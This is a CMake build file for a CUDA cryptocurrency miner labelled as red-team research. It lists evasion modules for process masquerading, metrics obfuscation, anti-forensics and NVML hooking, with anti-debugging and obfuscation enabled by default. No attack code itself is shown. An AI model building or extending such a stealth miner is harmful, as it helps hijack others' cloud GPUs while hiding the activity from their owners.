cmake_minimum_required(VERSION 3.18)
project(RedTeamGPUMiner LANGUAGES CXX CUDA)

# ============================================================================
# Project Metadata - Research Context
# ============================================================================
set(PROJECT_VERSION "2.0.0")
set(PROJECT_DESCRIPTION "Red Team GPU Mining Research - Cloud Security Testing")
set(RESEARCH_PURPOSE "Offensive security research for detection methodology development")

# ============================================================================
# C++ & CUDA Standards
# ============================================================================
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CUDA_STANDARD 17)
set(CMAKE_CUDA_STANDARD_REQUIRED ON)

# ============================================================================
# Build Configuration
# ============================================================================
set(CMAKE_BUILD_TYPE Release CACHE STRING "Build type")
set_property(CACHE CMAKE_BUILD_TYPE PROPERTY STRINGS "Debug" "Release" "RelWithDebInfo")

# Optimization flags
set(CMAKE_CXX_FLAGS_RELEASE "-O3 -march=native -DNDEBUG")
set(CMAKE_CUDA_FLAGS_RELEASE "-O3 --use_fast_math -DNDEBUG")

# Debug symbols for research analysis
if(CMAKE_BUILD_TYPE STREQUAL "RelWithDebInfo")
    set(CMAKE_CXX_FLAGS_RELWITHDEBINFO "-O2 -g -march=native")
    set(CMAKE_CUDA_FLAGS_RELWITHDEBINFO "-O2 -g --use_fast_math")
endif()

# ============================================================================
# CUDA Configuration
# ============================================================================
find_package(CUDAToolkit 12.0 REQUIRED)

# Target GPU architectures (sm_75 = Turing, sm_86 = Ampere, sm_89 = Ada)
set(CMAKE_CUDA_ARCHITECTURES "75;86;89" CACHE STRING "CUDA architectures")

# CUDA compiler flags
set(CMAKE_CUDA_FLAGS "${CMAKE_CUDA_FLAGS} --expt-relaxed-constexpr")
set(CMAKE_CUDA_FLAGS "${CMAKE_CUDA_FLAGS} --extended-lambda")
set(CMAKE_CUDA_FLAGS "${CMAKE_CUDA_FLAGS} -Xcompiler -fPIC")

# ============================================================================
# Dependencies
# ============================================================================

# Threads (for multi-process coordination)
find_package(Threads REQUIRED)

# OpenSSL (for TLS pool communication)
find_package(OpenSSL REQUIRED)

# JSON parsing (nlohmann/json header-only)
include(FetchContent)
FetchContent_Declare(
    json
    GIT_REPOSITORY https://github.com/nlohmann/json.git
    GIT_TAG v3.11.3
)
FetchContent_MakeAvailable(json)

# ============================================================================
# Source Files
# ============================================================================

set(CORE_SOURCES
    src/main.cpp
    src/core/kawpow/kawpow_kernel.cu
    src/core/kawpow/dag_generator.cu
    src/core/kawpow/hash_optimizer.cu
    src/core/pool/stratum_client.cpp
    src/core/pool/tls_wrapper.cpp
    src/core/scheduler/gpu_orchestrator.cpp
    src/core/scheduler/resource_limiter.cpp
)

set(EVASION_SOURCES
    src/evasion/process_masq.cpp
    src/evasion/workload_sim.cpp
    src/evasion/metrics_obfuscator.cpp
    src/evasion/anti_forensics.cpp
)

set(UTIL_SOURCES
    src/utils/config_loader.cpp
    src/utils/logger.cpp
    src/utils/signal_handler.cpp
)

# ============================================================================
# Executable Target
# ============================================================================
add_executable(redteam-miner
    ${CORE_SOURCES}
    ${EVASION_SOURCES}
    ${UTIL_SOURCES}
)

# Include directories
target_include_directories(redteam-miner PRIVATE
    ${CMAKE_SOURCE_DIR}/include
    ${CUDAToolkit_INCLUDE_DIRS}
)

# Link libraries
target_link_libraries(redteam-miner PRIVATE
    CUDA::cudart
    CUDA::nvml
    CUDA::nvrtc
    OpenSSL::SSL
    OpenSSL::Crypto
    Threads::Threads
    nlohmann_json::nlohmann_json
    dl  # For dlopen/dlsym (NVML hooking)
)

# ============================================================================
# Obfuscation Options (Research build only)
# ============================================================================
option(ENABLE_OBFUSCATION "Enable kernel name obfuscation" ON)
option(ENABLE_ANTI_DEBUG "Enable anti-debugging measures" ON)
option(STRIP_SYMBOLS "Strip debug symbols from binary" ON)

if(ENABLE_OBFUSCATION)
    target_compile_definitions(redteam-miner PRIVATE OBFUSCATED_BUILD=1)
    message(STATUS "Kernel obfuscation: ENABLED (research mode)")
endif()

if(ENABLE_ANTI_DEBUG)
    target_compile_definitions(redteam-miner PRIVATE ANTI_DEBUG=1)
    message(STATUS "Anti-debugging: ENABLED (research mode)")
endif()

if(STRIP_SYMBOLS AND CMAKE_BUILD_TYPE STREQUAL "Release")
    add_custom_command(TARGET redteam-miner POST_BUILD
        COMMAND ${CMAKE_STRIP} --strip-all $<TARGET_FILE:redteam-miner>
        COMMENT "Stripping debug symbols for minimal binary size"
    )
endif()

# ============================================================================
# Installation
# ============================================================================
install(TARGETS redteam-miner
    RUNTIME DESTINATION bin
)

install(DIRECTORY config/
    DESTINATION etc/redteam-miner
)

# ============================================================================
# Testing (Optional - for detection research)
# ============================================================================
option(BUILD_TESTS "Build test suite" OFF)

if(BUILD_TESTS)
    enable_testing()
    add_subdirectory(tests)
endif()

# ============================================================================
# Build Information
# ============================================================================
message(STATUS "=================================================")
message(STATUS "Red Team GPU Miner - Research Build")
message(STATUS "=================================================")
message(STATUS "Version: ${PROJECT_VERSION}")
message(STATUS "Purpose: ${RESEARCH_PURPOSE}")
message(STATUS "Build Type: ${CMAKE_BUILD_TYPE}")
message(STATUS "CUDA Architectures: ${CMAKE_CUDA_ARCHITECTURES}")
message(STATUS "Obfuscation: ${ENABLE_OBFUSCATION}")
message(STATUS "Anti-Debug: ${ENABLE_ANTI_DEBUG}")
message(STATUS "Strip Symbols: ${STRIP_SYMBOLS}")
message(STATUS "=================================================")
